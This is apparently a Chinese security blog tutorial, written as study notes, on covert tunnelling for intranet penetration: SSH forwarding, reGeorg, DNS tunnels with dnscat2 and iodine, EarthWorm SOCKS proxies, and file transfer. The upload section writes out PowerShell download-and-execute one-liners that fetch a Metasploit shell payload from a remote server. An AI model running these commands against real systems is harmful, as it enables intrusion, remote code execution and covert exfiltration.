前言：非淡泊无以明志，非宁静无以致远。

上篇：[《内网渗透基石篇--隐藏通信隧道技术（上）》](https://www.freebuf.com/articles/network/271827.html)

##  **一. 应用层隧道技术**

### 1\. ssh隧道

建立双向安全隧道

> 将其他TCP端口的通信通过SSH连接转发
>
> 用SSH作为传输层协议，对流量自动加解密
>
> 突破防火墙访问规则的限制
>
> SSH本地端口转发
>
> 本机侦听端口，访问转发到远程主机指定端口
    
    
    ssh -L -CfN <listen posrt> :<remote ip>:<remote port> user@<ssh server> -p <ssh server port>   
    #能够共享该隧道   
    ssh -L -CfNg <listen posrt> :<remote ip>:<remote port> user@<ssh server> -p <ssh server port>

基于建立起来的SSH隧道，隧道中断则端口转发中断

只能在建立隧道时创建转发，不能为已有隧道增加端口转发

远程端口转发

远程侦听端口，访问转发到本机主机指定端口

    
    
    ssh -R -CfNg <listen posrt> :<remote ip>:<remote port> user@<ssh server> -p <ssh server port>

内网为服务器

动态端口转发

本地侦听socks4/5代理端口，由SSH server决定如何转发

    
    
    ssh -CfNg -D <listen port> user@<ssh server> -p <ssh server port>
    
    shsh root@x.x.1.1

> -C 压缩传输
>
> -f 将SSH传输转入后台执行
>
> -N 建立静默连接
>
> -g 允许远程主机连接本地用于转发的端口
>
> -L 本地端口转发
>
> 11001 本地端口

 **实验1:本地转发**

1.kali 10.10.10.128

2.centos7 10.10.10.133

3.win7 10.10.10.147

> -C 压缩传输
>
> -f 将SSH传输转入后台执行
>
> -N 建立静默连接
>
> -g 允许远程主机连接本地用于转发的端口
>
> -L 本地端口转发
>
> 11001 本地端口
>
> 192.168.160.139:3389 目标主机：目标端口
>
> `XXX@10.10.10.133`
>
> 跳板机
>
> 运行命令，输入跳板机的ssh登陆密码，就可以了

1.ssh -CfNg -L 11001:10.10.10.128:3389 XXX@10.10.10.133

![1623547119_60c55cefc558987ee492d.png!small?1623547120251](https://image.3001.net/images/20210613/1623547119_60c55cefc558987ee492d.png!small?1623547120251)

2.连接本地的11001端口，就会自动通过跳板机，连接到目标机的3389端口

    
    
    rdesktop 127.0.0.1:11001

![1623547146_60c55d0a3821f50f0a8c6.png!small?1623547146668](https://image.3001.net/images/20210613/1623547146_60c55d0a3821f50f0a8c6.png!small?1623547146668)

3.成功弹窗

![1623547155_60c55d138c188bbfc7236.png!small?1623547156043](https://image.3001.net/images/20210613/1623547155_60c55d138c188bbfc7236.png!small?1623547156043)

4.成功远程登录

![1623547163_60c55d1b041f49defe43c.png!small?1623547163489](https://image.3001.net/images/20210613/1623547163_60c55d1b041f49defe43c.png!small?1623547163489)

 **实验2：远程转发**

第一步：在跳板机ubuntu18上运行SSH远程转发命令

-R 远程端口转发

11111 kali rolling上的端口

192.168.160.139:3389 目标主机：目标端口

`root@192.168.160.140`

kali rolling

运行命令，输入kali rolling的ssh登陆密码，就可以了

    
    
    ssh -CfNg -R 11111:192.168.160.139:3389 root@192.168.160.140

 **第二步：在kali rolling上通过rdesktop连接本地的11111端口**

连接本地的11001端口，就会自动通过跳板机，连接到目标机的3389端口

    
    
    rdesktop 127.0.0.1:11111

![1623547173_60c55d2503e4c9a122c4e.png!small?1623547173463](https://image.3001.net/images/20210613/1623547173_60c55d2503e4c9a122c4e.png!small?1623547173463)

### 2.防御ssh隧道攻击的思路

 **产生原因** ：因为系统被攻击者利用，主要是因为系统访问控制措施不够。

 **解决措施** ：

> 1.建立带外管理的网络结构
>
> 2.在内网中限制ssh远程登录的地址及双向访问控制策略。

## 二、 http/https协议

http service代理用于将所有的流量转发到内网。常见的代理工具有reGeorg、meterpeter、tunna等。

实验：使用regeory工具进行远程扫描

工具下载地址：<https://github.com/sensepost/reGeorg>

### 第一步：在跳板机上传递隧道文件

![1623547415_60c55e17c066f9d5228b0.png!small?1623547416184](https://image.3001.net/images/20210613/1623547415_60c55e17c066f9d5228b0.png!small?1623547416184)

### 第二步：在kali rolling配置proxychains.conf

![1623547426_60c55e222d69474465bfc.png!small?1623547426504](https://image.3001.net/images/20210613/1623547426_60c55e222d69474465bfc.png!small?1623547426504)

![1623547432_60c55e28159944a24621f.png!small?1623547432477](https://image.3001.net/images/20210613/1623547432_60c55e28159944a24621f.png!small?1623547432477)

### 第三步：在kali rolling上启动代理

![1623547440_60c55e305fd624c761442.png!small?1623547440782](https://image.3001.net/images/20210613/1623547440_60c55e305fd624c761442.png!small?1623547440782)

![1623547455_60c55e3f60f833b533c1f.png!small?1623547455709](https://image.3001.net/images/20210613/1623547455_60c55e3f60f833b533c1f.png!small?1623547455709)

### 第四步：在目标机器开启防火墙，阻断kali rolling的访问

![1623547464_60c55e486c102a41a2c87.png!small?1623547464687](https://image.3001.net/images/20210613/1623547464_60c55e486c102a41a2c87.png!small?1623547464687)

### 第五步：在kali rolling上探测目标机器开放的端口

![1623547474_60c55e5239cb04a2cd5b0.png!small?1623547475708](https://image.3001.net/images/20210613/1623547474_60c55e5239cb04a2cd5b0.png!small?1623547475708)

## 三. DNs协议

 **定义**
：Dns协议是一种请求/应答协议，也是一种可用于应用层的隧道技术。虽然激增的dns流量可能会被发现，但基于传统socket隧道已经濒临淘汰及tcp、udp通信大量被防御系统拦截的状况。

dns是一个必不可少的服务，另一方面，dns报文本身具有穿透防火墙的能力。

用于管理僵尸网络和进行apt攻击的服务器叫做C&C服务器。 C&C节点分为两种，分别是 **c &C客户端**和 **c &c服务端。**

c&C通信是指植入c&c客户端的木马或者后门程序与c&C服务端上的远程控制程序之间的通信。

正常网络之间的通信，都是在tcp间建立tcp连接后进行的。在进行数据通信时：如果目标是ip地址，可以直接发送报文；

内网中安装了各种软/硬件防护措施来检查主机与外部网络的连接情况。

![1623547565_60c55eade5c0ecd77aa99.png!small?1623547566318](https://image.3001.net/images/20210613/1623547565_60c55eade5c0ecd77aa99.png!small?1623547566318)

域名型dns隧道木马

### 1.查看dns的连通性

![1623547580_60c55ebcebb332f1f3006.png!small?1623547581398](https://image.3001.net/images/20210613/1623547580_60c55ebcebb332f1f3006.png!small?1623547581398)

### 2.dnscat2 软件

模式： **直连模式** 和 **中继模式。**

 **特点** ：

支持多个会话

流量加密

使用密钥防止MITM攻击

在内存中直接执行Powershell 脚本

隐蔽通信

 **安装使用步骤：**

（1） 部署域名解析

（2）安装dnscat2 服务端

（3）在目标主机上安装客户端

（4） 反弹shell

### 3.iodine

 **（1）安装服务端**

![1623547666_60c55f120b1b44b912f7b.png!small?1623547666534](https://image.3001.net/images/20210613/1623547666_60c55f120b1b44b912f7b.png!small?1623547666534)

运行iodine服务端iodined

iodined -f -c -P Micr067 192.168.0.1 vpn.abc.com -DD

-f：在前台运行

-c：禁止检查所有传入请求的客户端IP地址。

-P：客户端和服务端之间用于验证身份的密码。

-D：指定调试级别，-DD指第二级。“D”的数量随级别增加。

这里的192.168.0.1是自定义的局域网虚拟IP地址。

![1623547677_60c55f1d9aee6d14e7ad5.png!small?1623547677958](https://image.3001.net/images/20210613/1623547677_60c55f1d9aee6d14e7ad5.png!small?1623547677958)

 **（2）安装客户端**

 **linux环境** ：

iodine -f -P Micr067 vpn.abc.ltd -M 200

-r：iodine有时会自动将DNS隧道切换为UDP隧道，该参数的作用是强制在任何情况下使用DNS隧道

-M：指定上行主机的大小。

-m：调节最大下行分片的大小。

-T：指定DNS请求类型TYPE，可选项有NULL、PRIVATE、TXT、SRV、CNAME、MX、A。

-O：指定数据编码规范。

-L：指定是否开启懒惰模式，默认开启。

-I：指定两个请求之间的时间间隔。

 **windows环境** ：

windows客户端可以直接使用编译好的windows版本，同时需要安装TAP网卡驱动程序。也可以下载OpenVPN，在安装时仅选择TAP-Win32驱动程序，安装后服务器上就会多出一块“TAP-Wndows ADApter V9”的网卡。

运行客户端程序iodine，如果出现提示“Connection setup complete, transmitting
data”，就表示DNS隧道已经建立。

iodine -f -P Micr067 vpn.abc.com

**![1623547718_60c55f46f341e9e6c7e91.png!small?1623547719858](https://image.3001.net/images/20210613/1623547718_60c55f46f341e9e6c7e91.png!small?1623547719858)**

 **（3）使用dns隧道**

DNS隧道的使用方法比较简单，由于客户端和服务端在同一局域网中，只要直接访问服务端即可，例如，登录目标主机的3389端口，就可以直接执行 mstsc
10.0.0.1:3389。同样，目标主机也可以直接通过ssh登录服务 **端。**

 **（4）防御DNS隧道攻击的方法**

1.禁止网络中任何人向外部服务器发送DNS请求，只允许与受信任的DNS服务器通信。

2.虽然没有人会将TXT解析请求发送给DNS服务器，但是邮件服务器/网关会这样做，因此，可以将邮件服务器/网关列入白名单并阻止传入和传出流量中的TXT请求。

3.跟踪用户的DNS查询次数，如果达到阈值，就生成相应的报告。

##  **四、 Socks代理**

1.服务器在内网中，可以任意访问外部网络

2.服务器在内网中，可以访问外部网络，但服务器安装了防火墙来拒绝敏感端口的连接。

3.服务器在内网中，对外开放了部分端口，且服务器不能访问外部网络。

### 1\. 常用Socks代理工具

1.EarthWorm

2.reGEorg

3.sSocks

4.SocksCap64

5.Proxifier

6.ProxyChains

### 2\. Socks代理技术在网络环境中的应用

 **1.EarthWorm的应用**

    
    
    -l 开放指定端口监听
    -d 指定转发或反弹的主机地址
    -e 指定转发或反弹的主机端口
    -f 指定连接或映射的主机地址
    -g 指定连接或映射的主机端口
    -t 设置超时时间

Termite工具基本用法如下

1.服务端以服务模式启动一个agent服务，开启监听8888端口

    
    
    ./agent_exe -l 8888

2.管理端连接到agent并对agent进行管理

    
    
    ./admin_exe -c 127.0.0.1 -p 8888

3.此时，管理端端会得到一个内置的shell, 输入help指令可以得到帮助信息

    
    
    help

4.通过show指令可以得到当前agent的拓扑情况。

    
    
    show

5.将新agent加入当前拓扑

    
    
    ./agent_exe -c 127.0.0.1 -p 8888

6.此时show指令将得到如下效果 0M +– 1M | +– 2M
这表明，当前拓扑中有两个节点，其中由于2节点需要通过1节点才能访问，所以下挂在1节点下方。

7.在2节点开启socks代理，并绑定在本地端口

    
    
    goto 2      //将当前被管理节点切换为 2 号节点
    socks 1080  //本地1080 端口会启动个监听服务，而服务提供者为2号节点。

8.在1号节点开启一个shell并绑定到本地端口

    
    
    goto 1       //将当前被管理节点切换为 1 号节点
    shell 7777   //过nc本地的 7777 端口，就可以得到一个 1 节点提供的 shell.

9.将远程的文件下载至本地

    
    
    goto 1 
    downfile 1.txt 2.txt   //将1 节点，目录下的 1.txt 下载至本地，并命名为2.txt

10.上传文件至远程节点

    
    
    goto 2 
    upfile 2.txt 3.txt   //将本地的 2.txt 上传至 2号节点的目录，并命名为3.txt

11.端口转接

    
    
    goto 2 
    lcxtran 3388 10.0.0.1 3389   //以2号节点为跳板，将 10.0.0.1 的 3389 端口映射至本地的 3388 端口

### 2.ew的使用步骤

（1）正向socks5服务器

ew -s ssocked -l 888

（2）反弹socks5服务器

ew -s resocks -d x.x.x.x -e 888

（3）二级网络环境a

![1623547982_60c5604ee7103ea274d9f.png!small?1623547983380](https://image.3001.net/images/20210613/1623547982_60c5604ee7103ea274d9f.png!small?1623547983380)

（4）二级网络环境b

![1623547992_60c5605826479c0556c2b.png!small?1623547992567](https://image.3001.net/images/20210613/1623547992_60c5605826479c0556c2b.png!small?1623547992567)

（5）三级网络环境

![1623547999_60c5605fdef0f905cd91a.png!small?1623548000420](https://image.3001.net/images/20210613/1623547999_60c5605fdef0f905cd91a.png!small?1623548000420)

## 五、 压缩数据

### 1\. RAR

参数说明：

-a：添加要压缩的文件。

-k:锁定压缩文件

-s：生成存档文件（这样可以提高压缩比）。

-p：指定压缩密码

-r：递归压缩，包括子目录

-x：指定要排除的文件

-v：分卷打包，在打包大文件时用处很大。

-ep：从名称中排除路径。

-epl：从名称中排除基本目录

-mO：存储，添加到压缩文件时不压缩文件。

-ml：最快，使用最快压缩方式（低压缩比）

-m2：较快，使用快速压缩方式。

-m3：标准，使用标准压缩方式（默认）

-m4：较好，使用较强压缩方式（速度较慢）

-m5：最好，使用最强压缩方式（最好的压缩方式，但速度最慢）。

1.以rar文件格式压缩

![1623548062_60c5609e276e9f7fbb522.png!small?1623548062596](https://image.3001.net/images/20210613/1623548062_60c5609e276e9f7fbb522.png!small?1623548062596)

2.分卷压缩

![1623548070_60c560a6ca0ef1f9fa859.png!small?1623548071165](https://image.3001.net/images/20210613/1623548070_60c560a6ca0ef1f9fa859.png!small?1623548071165)

## 六、 上传和下载

### 1\. 利用ftp协议上传

 **常用的 FTP 命令** ：

open <ftp服务器地址>：连接指定的FTP服务器

cd：进入指定的目录

put/send <本地文件> <远程目录>：将目标机器本地文件上传到服务器远程目录 //
send和put方法用法都基本相同，但是上传速度send却要比put快很多

get <远程文件> <本地目录>：将ftp服务器上的文件下载到本地目标机器中

###
![1623548133_60c560e51ab2d69ec3092.png!small?1623548133715](https://image.3001.net/images/20210613/1623548133_60c560e51ab2d69ec3092.png!small?1623548133715)

### 2.利用Debug上传

DEBUG是一个DOS实用程序，是供程序员使用的程序调试工具，可以用它检查内存中任何地方的字节以及修改任何地方的字节。它可以用于逐指令执行某个程序以验证程序运行的正确性，也可以追踪执行过程、比较一个指令执行前后的值以及比较与移动内存中数据的范围，读写文件与磁盘扇区。

我们利用Debug向目标主机上传文件的原理就是，先将需要上传的exe文件转换为十六进制hex的格式，将hex的内容复制，再通过echo命令将hex内容写入到目标主机上的一个文件中，最后利用debug将hex内容编译成exe文件。

接下来，我们将nc.exe工具利用debug上传至目标主机。

我们使用kali中的exe2bat.exe工具（位于/usr/share/windows-binaries目录下）将二进制的nc.exe转换成16进制的表示，由于exe2bat是windows程序，所以在kali上我们要用wine来执行（linux是不能运行window下的可执行文件的，必须借助于wine）：

wine exe2bat.exe nc.exe nc.txt

![1623548158_60c560fe0f798d43c0e63.png!small?1623548158387](https://image.3001.net/images/20210613/1623548158_60c560fe0f798d43c0e63.png!small?1623548158387)

![1623548165_60c5610550692b2007405.png!small?1623548167037](https://image.3001.net/images/20210613/1623548165_60c5610550692b2007405.png!small?1623548167037)

### 3\. 利用NIshang上传

Download_Execute是Nishang中一个下载执行脚本，它在实战中最常用的功能就是下载一个文本文件，然后将其转换为exe可执行文件执行。

 **第一步**
：首先攻击者在本地用Nishang中的exetotext.ps1脚本将exe可执行文件更改为文本文件（这里我们的exe为msf生成的shell.exe）

    
    
    powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://39.xxx.xxx.210/nishang/Utility/ExetoText.ps1');ExetoText c:\shell.exe c:\shell.txt"

 **第二步**
：将生成的shell.txt放到vps上面，然后在目标主机上面用Download_Execute脚本下载改shell.txt，将其转化为exe后执行

    
    
    powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://39.xxx.xxx.210/nishang/Execution/Download_Execute.ps1');Download_Execute http://39.xxx.xxx.210/shell.txt

![1623548210_60c561325fe5d9b323193.png!small?1623548210769](https://image.3001.net/images/20210613/1623548210_60c561325fe5d9b323193.png!small?1623548210769)

4\. 利用bitsadmin上传YY6 03.7.6 利用powershell 上传

bitsadmin 可以用来在windows 命令行下下载文件。bitsadmin是 windows 后台智能传输服务的一个工具，windows
的自动更新，补丁之类的下载就是用这个工具来实现的。Windows Server2003和XP是没有bitsadmin的，Winc7及其之后的机器才有。
**bitsadmin 可以在网络不稳定的状态下下载文件，出错会自动重试，可靠性应该相当不错。**

![1623548226_60c56142deb86d89928cf.png!small?1623548228410](https://image.3001.net/images/20210613/1623548226_60c56142deb86d89928cf.png!small?1623548228410)

## 总结

内网隐藏通信隧道就学到这里了，中间参考了一些大佬的思路。中途做了几个实验，用来学习一些常用工具的使用，工具只有在使用的时候我觉得理解的更快啊！

